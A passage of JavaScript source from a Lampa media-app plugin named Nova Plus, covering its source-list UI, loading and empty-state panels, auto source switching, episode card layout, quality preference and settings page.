    return body.length === 0;
  }

  var loading_started = 0;
  var loading_timer = null;

  function loadingPanel() {
    uiFrame();
    note_sig = '';

    if (ui.hero && ui.hero.parent().length) {
      loadingStop();
      listHold().empty().append(skeleton(4));
      refreshCollection();
      var keep = (lockActive() && seek(ui_lock)) || seek(ui_focus);
      if (keep) focusNode(keep, true);
      return;
    }

    ui.hero_box.empty();
    ui.hero = null;
    ui.hero_kind = '';
    ui.rows.empty();

    if (!ui.load) {
      loading_started = Date.now();
      ui.load = $('<div class="nova-loading">' +
        '<div class="nova-loading__title"></div>' +
        '<div class="nova-loading__text"></div>' +
        '<div class="nova-loading__bar"><div></div></div>' +
        '</div>');
      ui.load.find('.nova-loading__title').text(text('nova_loading_title', 'nova_plus_loading_title'));
    }

    listHold().empty().append(ui.load).append(skeleton(modeWide() ? 10 : 3));
    loadingText();

    clearInterval(loading_timer);
    loading_timer = setInterval(loadingText, 1000);
  }

  function loadingText() {
    if (!ui.load || !ui.load.parent().length) return loadingStop();
    var seconds = Math.max(0, Math.round((Date.now() - loading_started) / 1000));
    var line = text('nova_loading_start', 'nova_plus_loading_start') +
      ' \u00b7 ' + seconds + text('nova_sec', 'nova_plus_sec');
    ui.load.find('.nova-loading__text').text(line);
    ui.load.find('.nova-loading__bar>div').css('width', Math.min(90, seconds * 7) + '%');
  }

  function loadingStop() {
    clearInterval(loading_timer);
    loading_timer = null;
    ui.load = null;
  }

  function noteStamp(native) {
    return [
      native.node.find(nativeOnlineSelector('.online-empty__title')).text().trim(),
      currentSourceKey(),
      sourceTitle(),
      (groups.sort || []).length,
      movie ? movie.id : 0
    ].join('|');
  }

  function notePanel(native) {
    var mark = noteStamp(native);
    var alive = ui.root && ui.root.parent().length && ui.list && ui.list.find('.nova-note').length;

    if (alive && note_sig === mark) {
      hostTimerStop(native);
      return ui.list.find('.nova-note').first();
    }

    note_sig = mark;

    uiFrame();
    loadingStop();
    lockRelease();
    switchDone();
    ui_open = '';
    buildHero();
    buildRows();

    var note = $('<div class="nova-note"><div class="nova-note__main">' +
      '<div class="nova-note__title"></div><div class="nova-note__text"></div>' +
      '<div class="nova-note__actions"></div></div></div>');

    var dead = currentSourceKey();
    if (dead && movie) probeSave(movie.id, dead, 'empty', 0);

    note.find('.nova-note__title').text(native.node.find(nativeOnlineSelector('.online-empty__title')).text().trim());
    note.find('.nova-note__text').text(native.node.find(nativeOnlineSelector('.online-empty__time')).text().trim());

    var actions = note.find('.nova-note__actions');

    var addAction = function (label, icon, run, keep_hop) {
      var button = $('<div class="nova-btn selector"></div>');
      button.attr('data-nova-focus', 'note:' + actions.children().length);
      if (icon) button.append(icon);
      button.append($('<span></span>').text(label));
      bind(button, function () {
        if (!keep_hop) hopStop();
        try { run(); } catch (e) {}
      });
      actions.append(button);
      return button;
    };

    hopReset();
    hopStop();
    hostTimerStop(native);
    if (dead) hop.tried[dead] = true;

    var next = (groups.sort || []).length > 1 ? nextSource() : null;
    var auto = !!next && autoSwitchOn();

    if (next) {
      addAction(text('nova_try_source', 'nova_plus_try_source')
        .replace('{name}', splitSourceName(next.title).name || next.title), ICON.play, function () {
        chooseSource(next);
      });
    }

    if ((groups.sort || []).length > 1) {
      addAction(text('nova_all_sources', 'nova_plus_all_sources'), ICON.chevron, function () {
        uiToggle('source');
      }, true);
    }

    addAction(text('nova_retry', 'nova_plus_retry'), ICON.refresh, function () {
      var comp = componentNow();
      if (reloadable(comp)) {
        signature = '';
        listHold().empty().append(skeleton(4));
        keepAlive(function () {
          if (typeof comp.reset === 'function') comp.reset();
          if (typeof comp.find === 'function') comp.find();
        });
        return;
      }
      try { Lampa.Activity.replace(); } catch (e) {}
    });

    if (auto) {
      var tic = 6;
      var slot = note.find('.nova-note__text');
      var name = splitSourceName(next.title).name || next.title;
      var render = function () {
        slot.text(text('nova_auto_next', 'nova_plus_auto_next')
          .replace('{sec}', tic).replace('{name}', name));
      };

      render();
      hop_timer = setInterval(function () {
        if (!ui.root || !ui.root.parent().length || !slot.parent().length) return hopStop();
        if (ui_open === 'source') return;
        tic--;
        render();
        if (tic > 0) return;
        hopStop();
        chooseSource(next);
      }, 1000);
    } else if (!next && (groups.sort || []).length > 1) {
      note.find('.nova-note__text').text(text('nova_dead_all', 'nova_plus_dead_all'));
    }

    var search = root.find('.filter--search').first();
    if (search.length) {
      var clarify = $('<div class="nova-btn selector"></div>');
      clarify.attr('data-nova-focus', 'note:clarify');
      clarify.append(ICON.search).append($('<span></span>').text(text('nova_clarify', 'nova_plus_clarify')));
      bind(clarify, function () {
        try { search.trigger('hover:enter'); } catch (e) {}
      });
      actions.append(clarify);
    }

    ui.list.empty().append(note);
    try { if (typeof wideNoteFit === 'function') wideNoteFit(); } catch (e) {}
    refreshCollection();

    var first = actions.find('.selector').first();
    var wanted = seek(ui_focus);
    if (!wanted || !$.contains(ui.root[0], wanted[0])) wanted = null;
    if (!wanted && first.length) wanted = first;
    if (!wanted) wanted = ui.rows.find('.nova-chip').first();
    if (wanted && wanted.length) {
      ui_focus = wanted.attr('data-nova-focus') || '';
      focusNode(wanted, true);
    }
    return note;
  }

  function showPage(start, focus) {
    lockRelease();
    ui_open = '';
    ui_focus = '';
    ui_page = start;
    ui_page_focus = typeof focus === 'number' ? focus : start;
    redraw();
  }

  function stamp() {
    return [
      items.length,
      nav ? 'nav' : 'files',
      sourceTitle(),
      groups.season ? groups.season.subtitle : '',
      groups.voice ? groups.voice.subtitle : '',
      extrasStamp(),
      viewMode(),
      ui_open,
      ui_page,
      ui_all_sources ? 1 : 0,
      items.length ? items[0].title : '',
      items.filter(function (i) { return isSeen(i); }).length
    ].join('|');
  }

  function draw() {
    if (!enabled() || busy) return;

    var found = scope();
    if (!found) return;

    root = found.root;
    host = found.body[0];
    movie = found.movie;
    patchHost(componentNow());
    filter = activeFilter(root) || filter;
    groups = readGroups(filter);
    extras = readExtras();
    if (serial && filter && !groups.voice && Date.now() < voice_group_retry_until) {
      clearTimeout(voice_group_retry_timer);
      voice_group_retry_timer = setTimeout(function () {
        voice_group_retry_timer = null;
        signature = '';
        scheduleNow();
      }, 250);
    }

    var native = nativeState();
    if (native) {
      busy = true;
      knownRemember();
      root.addClass('nova-plus-scope nova-plus-chips');
      native.node.addClass('nova-plus-hidden');
      items = [];
      signature = '';
      if (native.kind === 'loading') {
        if (pendingLive() && ui.list && ui.list.find('.nova-skeleton').length) {
          busy = false;
          return;
        }
        loadingPanel();
      } else notePanel(native);
      busy = false;
      return;
    }

    var list = collect();
    if (!list.length) {
      if (blank()) {
        busy = true;
        root.addClass('nova-plus-scope nova-plus-chips');
        items = [];
        signature = '';
        loadingPanel();
        busy = false;
      }
      return;
    }

    var files = list.filter(function (item) { return !item.folder; });
    nav = files.length === 0;
    serial = !!(movie.name || movie.number_of_seasons) && !nav;
    if (serial && filter && !groups.voice && !voice_group_retry_until) {
      voice_group_retry_until = Date.now() + 5000;
      clearTimeout(voice_group_retry_timer);
      voice_group_retry_timer = setTimeout(function () {
        voice_group_retry_timer = null;
        signature = '';
        scheduleNow();
      }, 250);
    }

    items = list;
    var mark = stamp();

    if (signature === mark && ui.list && ui.list.children().length) return;

    busy = true;
    signature = mark;
    note_sig = '';
    knownRemember();

    hopStop();
    hopReset();
    loadingStop();
    root.addClass('nova-plus-scope nova-plus-chips');
    uiFrame();

    if (!nav) {
      var current = null;
      (groups.sort || []).forEach(function (entry) {
        if (entry.selected) current = entry;
      });
      var key = current ? (current.source || current.title) : '';
      if (key) {
        probeSave(movie.id, key, 'ok', files.length);
        var best = '';
        files.forEach(function (item) {
          var label = shortQuality(item.quality);
          if ((QUALITY_RANK[label] || 0) > (QUALITY_RANK[best] || 0)) best = label;
        });
        rememberQuality(key, best);
      }
    }

    hideHost();
    list.forEach(function (item) {
      item.origin.removeClass('selector');
    });

    var compact = !serial && !nav && list.length > 1;
    var grid = !nav && list.length > 0 && (modeWide() || viewMode() === 'grid');
    if (grid) ui.list.addClass('nova__list--grid');
    else ui.list.removeClass('nova__list--grid');
    wideStrip(list);

    var paged = !nav && list.length > JUMP_FROM && !(wideOn() && wideRow());
    var start = 0;
    var end = list.length - 1;

    if (paged) {
      var all = pages(list.length);
      var page;
      if (ui_page < 0 || ui_page >= list.length) {
        var resume = pickResume(list);
        page = pageAt(all, resume ? resume.index : 0);
      } else page = pageAt(all, ui_page);
      ui_page = page.start;
      start = page.start;
      end = page.end;
    } else ui_page = 0;

    ui.list.empty();
    wideOrderList(list).forEach(function (item) {
      if (paged && (item.index < start || item.index > end)) {
        item.card = null;
        return;
      }
      ui.list.append(buildCard(item, compact && !grid, grid));
    });
    listFree();

    var button = buildHero();
    buildRows();

    var locked = lockActive();
    var fallback = false;
    if (ui_page_focus >= 0) {
      var wanted = list[ui_page_focus];
      if (wanted && wanted.card) fallback = wanted.card;
      ui_page_focus = -1;
    }
    if (!fallback && ui_open) {
      var entry = dropEntry();
      if (entry) fallback = $(entry);
    }
    if (!fallback && button && button.length && !locked && !ui_open) fallback = button;
    if (!fallback) fallback = ui.list.find('.nova-card').first();

    restoreFocus(fallback);
    if (locked) lockRelease();
    switchDone();
    busy = false;
    relayout();
    probeSchedule();
    voiceSchedule();
    var retryStamp = [movie && movie.id, currentSourceKey(), seasonNumber() || 0].join('|');
    if (voice_retry_stamp !== retryStamp) {
      voice_retry_stamp = retryStamp;
      clearTimeout(voice_retry_timer);
      voice_retry_timer = setTimeout(function () {
        if (!inSkin() || !voiceWanted()) return;
        voice_done = '';
        voiceSchedule();
        voicePaint();
      }, 1800);
    }
  }

  function relayout() {
    try {
      if (!Lampa.Layer || typeof Lampa.Layer.update !== 'function') return;
      var current = Lampa.Activity.active();
      if (!current || !current.activity) return;
      var target = current.activity.render();
      Lampa.Layer.update(target);
      setTimeout(function () {
        try { Lampa.Layer.update(target); } catch (e) {}
      }, 120);
    } catch (e) {}
  }

  function redraw() {
    signature = '';
    note_sig = '';
    if (ui.list) ui.list.empty();
    draw();
  }

  var timer = null;
  var observer = null;
  var observed = null;

  function activeNode() {
    try {
      var current = Lampa.Activity.active();
      if (!current || !current.activity) return null;
      return current.activity.render()[0] || null;
    } catch (e) {
      return null;
    }
  }

  function scoped() {
    return !!(root && root.hasClass('nova-plus-scope'));
  }

  function schedule() {
    if (busy) return;
    clearTimeout(timer);
    timer = setTimeout(draw, 60);
  }

  function scheduleNow() {
    if (busy) return;
    if (scoped()) return schedule();
    clearTimeout(timer);
    draw();
    if (!scoped()) schedule();
  }

  function attach() {
    if (!window.MutationObserver || !enabled()) return;
    if (observer) observer.disconnect();

    var target = activeNode();
    if (!target) return;
    observed = target;

    observer = new MutationObserver(function (records) {
      for (var i = 0; i < records.length; i++) {
        var node = records[i].target;
        if (node && node.nodeType === 1 && $(node).closest('.nova-plus-root').length) continue;
        if (pendingLive()) reattach();
        return scheduleNow();
      }
    });
    observer.observe(target, { childList: true, subtree: true });
  }

  function detach() {
    if (observer) observer.disconnect();
    observer = null;
    observed = null;
    afterPlayerStop();
    hopStop();
    probeStop();
    voiceStop();
    voice_done = '';
    voice_seed_done = '';
    voice_seen = { id: 0, season: 0, origin: '', list: [] };
    probe_url = '';
    clearTimeout(voice_retry_timer);
    clearTimeout(voice_group_retry_timer);
    voice_retry_stamp = '';
    voice_group_retry_timer = null;
    voice_group_retry_until = 0;
    clearTimeout(timer);
    lockStopWatch();
    loadingStop();
    forget();
  }

  function refreshMarks() {
    if (!inSkin() || !items.length) return;
    var grid = !!(ui.list && ui.list.hasClass('nova__list--grid'));

    items.forEach(function (item) {
      if (!item || item.soon || item.folder) return;

      var line = item.origin ? item.origin.find('.time-line').first() : null;
      if (line && line.length) item.line = line;

      var percent = 0;
      if (item.hash) {
        try { percent = Lampa.Timeline.view(item.hash).percent || 0; } catch (e) { percent = 0; }
      }
      if (!percent && item.line && item.line.length) {
        var raw = (item.line.children('div').first().attr('style') || '').match(/([\d.]+)%/);
        if (raw) percent = parseFloat(raw[1]) || 0;
      }
      item.percent = percent;
      if (item.origin && item.origin.find(nativeOnlineSelector('.online-prestige__viewed')).length) item.viewed = true;

      var card = item.card;
      if (!card || !card.length) return;

      var box = card.find('.nova-card__line');
      if (box.length && item.line && item.line.length) {
        box.empty().append(item.line.clone());
      }

      if (isSeen(item)) {
        if (grid) {
          var thumb = card.find('.nova-card__thumb');
          if (thumb.length && !thumb.find('.nova-card__viewed').length) {
            thumb.append('<div class="nova-card__viewed">' + ICON.eye + '</div>');
          }
        } else {
          var side = card.find('.nova-card__side');
          if (side.length && !side.find('.nova-card__eye').length) {
            side.append('<div class="nova-card__eye">' + ICON.eye + '</div>');
          }
        }
      } else {
        card.find('.nova-card__viewed,.nova-card__eye').remove();
      }
    });

    var keep = last;
    try { buildHero(); } catch (e) {}
    if (keep && $.contains(document.body, keep) && shown(keep)) {
      last = keep;
      try {
        var now = Lampa.Controller.enabled();
        if (now && now.name === 'content') {
          refreshCollection();
          Lampa.Controller.collectionFocus(keep, host);
        }
      } catch (e) {}
    } else keepFocus();
    relayout();
  }

  var after_player = [];

  function afterPlayerStop() {
    after_player.forEach(function (id) { clearTimeout(id); });
    after_player = [];
    clearTimeout(soft_timer);
  }

  function refreshBurst() {
    afterPlayerStop();
    refreshMarks();
    [80, 400, 1200].forEach(function (wait) {
      after_player.push(setTimeout(refreshMarks, wait));
    });
  }

  var soft_timer = null;

  function refreshSoft() {
    clearTimeout(soft_timer);
    soft_timer = setTimeout(function () {
      try {
        if (Lampa.Player && typeof Lampa.Player.opened === 'function' && Lampa.Player.opened()) return;
      } catch (e) {}
      refreshMarks();
    }, 250);
  }

  var outside = false;

  function hookPlayer() {
    try {
      if (Lampa.Player && Lampa.Player.listener) {
        Lampa.Player.listener.follow('destroy', function () {
          outside = false;
          refreshBurst();
        });
        Lampa.Player.listener.follow('external', function () {
          outside = true;
        });
      }
    } catch (e) {}

    try {
      if (Lampa.Timeline && Lampa.Timeline.listener && Lampa.Timeline.listener.follow) {
        Lampa.Timeline.listener.follow('update', refreshSoft);
      } else {
        Lampa.Listener.follow('state:changed', function (e) {
          if (e && e.target === 'timeline' && e.reason === 'update') refreshSoft();
        });
      }
    } catch (e) {}

    var back = function () {
      try {
        if (document.visibilityState && document.visibilityState !== 'visible') return;
      } catch (e) {}
      if (!outside) return;
      outside = false;
      refreshBurst();
    };

    try {
      document.addEventListener('visibilitychange', back, false);
      window.addEventListener('focus', back, false);
    } catch (e) {}
  }

  function hookQuality() {
    try {
      if (!Lampa.Player || !Lampa.Player.listener) return;
      Lampa.Player.listener.follow('start', function (data) {
        try {
          var want = parseInt(preferredQuality(), 10);
          if (!want || !data || !data.quality || typeof data.quality !== 'object') return;
          var keys = Object.keys(data.quality);
          if (!keys.length) return;
          var best = null;
          var diff = Infinity;
          for (var i = 0; i < keys.length; i++) {
            var num = parseInt(keys[i], 10);
            if (isNaN(num)) continue;
            if (num <= want && (want - num) < diff) {
              best = keys[i];
              diff = want - num;
            }
          }
          if (!best) {
            best = keys.sort(function (a, b) { return parseInt(a, 10) - parseInt(b, 10); })[0];
          }
          if (best && data.quality[best]) data.url = data.quality[best];
        } catch (e) {}
      });
    } catch (e) {}
  }

  function settings() {
    try {
      Lampa.SettingsApi.addComponent({
        component: 'nova_plus',
        icon: '<svg height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 1c.9 6.2 2.2 10.4 4.1 12.7C24 16 28 17.3 34 18c-6 .7-10 2-11.9 4.3C20.2 24.6 18.9 28.8 18 35c-.9-6.2-2.2-10.4-4.1-12.7C12 20 8 18.7 2 18c6-.7 10-2 11.9-4.3C15.8 11.4 17.1 7.2 18 1z" fill="white"/><circle cx="18" cy="18" r="3.6" fill="white"/></svg>',
        name: 'Nova Plus'
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: ENABLED_KEY, type: 'trigger', default: true },
        field: {
          name: label('nova_plus_set_enable'),
          description: label('nova_plus_set_enable_descr')
        },
        onChange: function () { try { Lampa.Activity.replace(); } catch (e) {} }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: {
          name: MODE_KEY,
          type: 'select',
          values: {
            wide: label('nova_plus_mode_wide'),
            skin: label('nova_plus_mode_skin')
          },
          default: 'wide'
        },
        field: {
          name: label('nova_plus_set_mode'),
          description: label('nova_plus_set_mode_descr')
        },
        onChange: function () { try { Lampa.Activity.replace(); } catch (e) {} }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: 'nova_plus_hero', type: 'trigger', default: true },
        field: {
          name: label('nova_plus_set_hero'),
          description: lockedOn(label('nova_plus_set_hero_descr'))
        },
        onChange: function () { try { Lampa.Activity.replace(); } catch (e) {} }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: 'nova_plus_hero_art', type: 'trigger', default: true },
        field: {
          name: label('nova_plus_set_hero_art'),
          description: lockedOn(label('nova_plus_set_hero_art_descr'))
        },
        onChange: function () { try { Lampa.Activity.replace(); } catch (e) {} }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: {
          name: 'nova_plus_art_size',
          type: 'select',
          values: {
            auto: label('nova_plus_art_auto'),
            w780: label('nova_plus_art_780'),
            w1280: label('nova_plus_art_1280'),
            original: label('nova_plus_art_orig')
          },
          default: 'auto'
        },
        field: {
          name: label('nova_plus_set_art_size'),
          description: label('nova_plus_set_art_size_descr')
        },
        onChange: function () { try { Lampa.Activity.replace(); } catch (e) {} }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: 'nova_plus_logo', type: 'trigger', default: true },
        field: {
          name: label('nova_plus_set_logo'),
          description: label('nova_plus_set_logo_descr')
        },
        onChange: function () {
          if (movie && ui.hero) heroLogo();
        }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: 'nova_plus_fullscreen', type: 'trigger', default: true },
        field: {
          name: label('nova_plus_set_full'),
          description: lockedOn(label('nova_plus_set_full_descr'))
        },
        onChange: function () { applyFullScreen(); }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: 'nova_plus_fade', type: 'trigger', default: false },
        field: {
          name: label('nova_plus_set_fade'),
          description: label('nova_plus_set_fade_descr')
        },
        onChange: function () { applyEdgeFade(); }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: 'nova_plus_probe', type: 'trigger', default: false },
        field: {
          name: label('nova_plus_set_probe'),
          description: label('nova_plus_set_probe_descr')
        },
        onChange: function () { redraw(); }
      });

      try {
        Lampa.Settings.listener.follow('open', function (e) {
          if (!e || e.name !== 'nova_plus' || !e.body) return;

          var mode = probeHook();
          var item = e.body.find('[data-name="nova_plus_probe"]');
          if (!item.length) return;

          if (mode === 'disabled') {
            item.addClass('hide');
            return;
          }

          item.removeClass('hide');

          var descr = item.find('.settings-param__descr');
          if (!descr.length) return;

          if (mode === 'external') {
            descr.text(label('nova_plus_set_probe_ext'));
            item.css('opacity', '.6');
          } else {
            descr.text(label('nova_plus_set_probe_descr'));
            item.css('opacity', '');
          }
        });
      } catch (e) {}

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: { name: 'nova_plus_auto_switch', type: 'trigger', default: true },
        field: {
          name: label('nova_plus_set_switch'),
          description: label('nova_plus_set_switch_descr')
        }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: {
          name: 'nova_plus_view',
          type: 'select',
          values: {
            list: label('nova_plus_view_list'),
            grid: label('nova_plus_view_grid')
          },
          default: 'list'
        },
        field: {
          name: label('nova_plus_set_view'),
          description: lockedOff(label('nova_plus_set_view_descr'))
        },
        onChange: function () { redraw(); }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: {
          name: 'nova_plus_quality',
          type: 'select',
          values: {
            auto: label('nova_plus_set_quality_auto'),
            2160: '4K',
            1080: '1080p',
            720: '720p',
            480: '480p'
          },
          default: 'auto'
        },
        field: {
          name: label('nova_plus_set_quality'),
          description: label('nova_plus_set_quality_descr')
        }
      });

      Lampa.SettingsApi.addParam({
        component: 'nova_plus',
        param: {
          name: 'nova_plus_focus_style',
          type: 'select',
          values: {
            ring: label('nova_plus_set_focus_ring'),
            fill: label('nova_plus_set_focus_fill')
          },
          default: 'ring'
        },
        field: {
          name: label('nova_plus_set_focus'),
          description: label('nova_plus_set_focus_descr')
        },
        onChange: function () { applyFocusStyle(); }
      });
      wideSettings();
    } catch (e) {}
  }

  function hookLogo() {
    try {
      Lampa.Listener.follow('full', function (e) {
        try {
          if (!e || e.type !== 'complite' || !logoOn()) return;
          var card = e.data && e.data.movie;
          if (!card || !card.id) return;
          logoFetch(card, function (path) {
            if (path) logoWarm(path);
          });
        } catch (err) {}
      });
    } catch (err) {}
  }

  function start() {
    settings();
    hookLogo();
    addCSS();
    applyFocusStyle();
    applyFullScreen();
    applyEdgeFade();
    handWatch();
    hookFilter();
    hookScroll();
    hookSelect();
    hookController();
    hookQuality();
    hookPlayer();
    hookReplace();
    hookRequest();
    hookXHR();

    var lastW = 0;
    var lastH = 0;
    try {
      lastW = window.innerWidth;
      lastH = window.innerHeight;
      window.addEventListener('resize', function () {
        var nowW = window.innerWidth;
        var nowH = window.innerHeight;
        if ((lastW < 600) !== (nowW < 600) || (lastH > lastW) !== (nowH > nowW)) {
          lastW = nowW;
          lastH = nowH;
          if (ui.rows && ui.rows.find('.nova-toolbar').length) {
            fitToolbar(ui.rows.find('.nova-toolbar'));
          }
        }
      });
    } catch (e) {}

    Lampa.Listener.follow('activity', function (e) {
      if (e.type === 'start' || e.type === 'archive') {
        detach();
        if (pendingLive()) {
          attach();
          if (reattach()) return schedule();
          switchDone();
          forget();
        }
        attach();
        draw();

        setTimeout(function () {
          attach();
          draw();
        }, 100);
      }
      if (e.type === 'destroy') {
        if (pendingLive()) {
          if (observer) observer.disconnect();
          observer = null;
          observed = null;
          clearTimeout(timer);
          lockStopWatch();
          leaveGuard();
          return;
        }
        inplaceStop();
        detach();
      }
    });

    Lampa.Controller.listener.follow('toggle', function (e) {
      if (e.name !== 'content') return;
      var target = activeNode();
      if (target && target !== observed) {
        forget();
        attach();
        if (pendingLive()) {
          if (reattach()) return schedule();
          switchDone();
        }
        return scheduleNow();
      }
      schedule();
    });
  }

  var WIDE_LAYOUT_KEY = 'nova_plus_layout';
  var WIDE_ORDER_KEY = 'nova_plus_order';
  var WIDE_META_KEY = 'nova_plus_meta';
  var WIDE_POS_KEY = 'nova_plus_source_pos';
  var WIDE_MAX_LINES = 99;
  var wide_was = 0;
  var wide_hold_timer = null;

  var WIDE_OWN = {
    nova_plus_seasons: { ru: 'Сезон', uk: 'Сезон', en: 'Season' },
    nova_plus_parts: { ru: 'Части', uk: 'Частини', en: 'Parts' },
    nova_plus_voices: { ru: 'Перевод', uk: 'Переклад', en: 'Audio' },
    nova_plus_ep_one: { ru: '{count} эпизод', uk: '{count} епізод', en: '{count} episode' },
    nova_plus_ep_few: { ru: '{count} эпизода', uk: '{count} епізоди', en: '{count} episodes' },
    nova_plus_ep_many: { ru: '{count} эпизодов', uk: '{count} епізодів', en: '{count} episodes' },
    nova_plus_all: { ru: 'всего {count}', uk: 'усього {count}', en: '{count} total' },
    nova_plus_order: { ru: 'Порядок', uk: 'Порядок', en: 'Order' },
    nova_plus_order_straight: { ru: 'Стандарт', uk: 'Стандарт', en: 'Standard' },
    nova_plus_order_reverse: { ru: 'Обратный', uk: 'Зворотний', en: 'Reversed' },
    nova_plus_look: { ru: 'Вид', uk: 'Вигляд', en: 'Layout' },
    nova_plus_look_row: { ru: 'Горизонтальный', uk: 'Горизонтальний', en: 'Horizontal' },
    nova_plus_look_grid: { ru: 'Вертикальный', uk: 'Вертикальний', en: 'Vertical' },
    nova_plus_reset: { ru: 'Сбросить фильтр', uk: 'Скинути фільтр', en: 'Reset filter' },
    nova_plus_set_pos: { ru: 'Положение источника', uk: 'Розташування джерела', en: 'Source row position' },
    nova_plus_set_pos_descr: { ru: 'Где стоит строка с источником: над сезонами или под ними', uk: 'Де стоїть рядок із джерелом: над сезонами або під ними', en: 'Where the source row sits: above or below the seasons' },
    nova_plus_pos_top: { ru: 'Вверху', uk: 'Вгорі', en: 'Top' },
    nova_plus_pos_bottom: { ru: 'Внизу', uk: 'Внизу', en: 'Bottom' },
    nova_plus_set_look: { ru: 'Лента серий', uk: 'Лента серій', en: 'Episode strip' },
    nova_plus_set_look_descr: { ru: 'Вертикальная сетка по умолчанию, горизонтальная по переключателю', uk: 'Вертикальна сітка за замовчуванням, горизонтальна за перемикачем', en: 'Vertical grid by default, horizontal by toggle' },
    nova_plus_set_order: { ru: 'Порядок серий', uk: 'Порядок серій', en: 'Episode order' },
    nova_plus_set_order_descr: { ru: 'Обратный удобен для сериалов, которые ещё выходят', uk: 'Зворотний зручний для серіалів, що ще виходять', en: 'Reversed suits shows that are still airing' },
    nova_plus_set_meta: { ru: 'Описания серий', uk: 'Описи серій', en: 'Episode details' },
    nova_plus_set_meta_descr: { ru: 'Добирать дату, рейтинг и описание серии из TMDB', uk: 'Добирати дату, рейтинг та опис серії з TMDB', en: 'Pull episode date, rating and overview from TMDB' }
  };

  for (var wide_key in WIDE_OWN) OWN[wide_key] = WIDE_OWN[wide_key];

  try { Lampa.Lang.add(WIDE_OWN); } catch (e) {}

  function wideSerial() {
    try { return !!(movie && movie.number_of_seasons); } catch (e) { return false; }
  }

  function wideOn() { return modeWide() && wideSerial(); }
  function wideRow() { return get(WIDE_LAYOUT_KEY, 'grid') === 'row'; }
  function wideReverse() { return get(WIDE_ORDER_KEY, 'straight') === 'reverse'; }
  function wideMeta() { return get(WIDE_META_KEY, true) !== false; }
  function widePos() { return get(WIDE_POS_KEY, 'top') === 'bottom' ? 'bottom' : 'top'; }
  function widePosBottom() { return widePos() === 'bottom'; }
  function wideSwapOn() { return ui_open === 'source'; }

  var ALIEN_ROOT = '.nova-skin-root,.nova-wide-root,.z01-root,.z01';
  var ALIEN_HIDDEN = '.nova-hidden,.nova-wide-hidden,.z01-hidden';
  var ALIEN_SCOPE = 'nova-skin-scope nova-skin-chips nova-wide-scope nova-wide-chips z01-scope z01-chips';

  function wideEvict(body) {
    try {
      body.children('.nova-plus-root').removeClass('nova-hidden nova-wide-hidden z01-hidden');
      var alien = body.find(ALIEN_ROOT);
      if (!alien.length) return;
      var native = body.find(nativeOnlineSelector('.online-prestige--full,.online-prestige--folder')).filter(function () {
        return !$(this).closest(ALIEN_ROOT).length;
      });
      if (!native.length) return;
      alien.remove();
      body.find(ALIEN_HIDDEN).removeClass('nova-hidden nova-wide-hidden z01-hidden');
      body.closest('.explorer').removeClass(ALIEN_SCOPE);
    } catch (e) {}
  }

  var WIDE_MONTHS = ['Января', 'Февраля', 'Марта', 'Апреля', 'Мая', 'Июня', 'Июля', 'Августа', 'Сентября', 'Октября', 'Ноября', 'Декабря'];
  var WIDE_TAG_MAP = {
    HEVC: 'HEVC', H265: 'HEVC', 'H.265': 'HEVC', X265: 'HEVC',
    AVC: 'AVC', H264: 'AVC', 'H.264': 'AVC', X264: 'AVC',
    AV1: 'AV1', VP9: 'VP9',
    AAC: 'AAC', AC3: 'AC3', EAC3: 'EAC3', 'DD+': 'EAC3',
    'DTS-HD': 'DTS-HD', DTS: 'DTS', FLAC: 'FLAC', OPUS: 'OPUS', MP3: 'MP3',
    ATMOS: 'Atmos', 'HDR10+': 'HDR10+', HDR10: 'HDR10', HDR: 'HDR', SDR: 'SDR', '10BIT': '10bit'
  };
  var WIDE_TAG_FIND = /(HDR10\+|HDR10|HDR|DTS-HD|DTS|H\.?26[45]|x26[45]|HEVC|AVC|AV1|VP9|EAC3|AC3|DD\+|AAC|FLAC|OPUS|MP3|Atmos|SDR|10 ?bit)/gi;
  var WIDE_CHANNELS = /(\d)(?:\.0)?\s*(?:ch\b|канал[аов]*)/i;

  var wide_counts = {};
  var wide_book = {};
  var wide_wait = {};
  var wide_sig = '';
  var wide_hold = null;

  function wideCount(value) {
    var count = parseInt(value, 10) || 0;
    var hundred = count % 100;
    var ten = count % 10;
    var key = 'nova_plus_ep_many';
    if (ten === 1 && hundred !== 11) key = 'nova_plus_ep_one';
    else if (ten >= 2 && ten <= 4 && (hundred < 10 || hundred >= 20)) key = 'nova_plus_ep_few';
    return label(key).replace('{count}', count);
  }

  function wideAll(value) {
    return label('nova_plus_all').replace('{count}', parseInt(value, 10) || 0);
  }

  function wideClock(seconds) {
    var total = Math.max(0, Math.round(seconds || 0));
    var hours = Math.floor(total / 3600);
    var mins = Math.floor((total % 3600) / 60);
    var secs = total % 60;
    var pad = function (value) { return (value < 10 ? '0' : '') + value; };
    if (hours) return hours + ':' + pad(mins) + ':' + pad(secs);
    return pad(mins) + ':' + pad(secs);
  }

  function wideSeconds(value) {
    var parts = String(value == null ? '' : value).trim().split(':');
    var num = function (at) { return parseInt(parts[at], 10) || 0; };
    if (parts.length === 3) return num(0) * 3600 + num(1) * 60 + num(2);
    if (parts.length === 2) return num(0) * 60 + num(1);
    return num(0) * 60;
  }

  function wideDate(value) {
    var found = String(value || '').match(/^(\d{4})-(\d{2})-(\d{2})/);
    if (!found) return '';
    var month = WIDE_MONTHS[(parseInt(found[2], 10) || 1) - 1];
    var day = parseInt(found[3], 10) || 1;
    if (!month) return found[3] + '.' + found[2] + '.' + found[1];
    return day + ' ' + month + ' ' + found[1];
  }

  function wideFiles() {
    var count = 0;
    items.forEach(function (item) { if (!item.folder && !item.soon) count++; });
    return count;
  }

  function wideSeasonCount(number, box) {
    var id = tmdbId();
    if (!id || !number) return 0;
    var key = id + ':' + number;
    if (typeof wide_counts[key] === 'number') return wide_counts[key];
    seasonPlanned(number, function (count) {
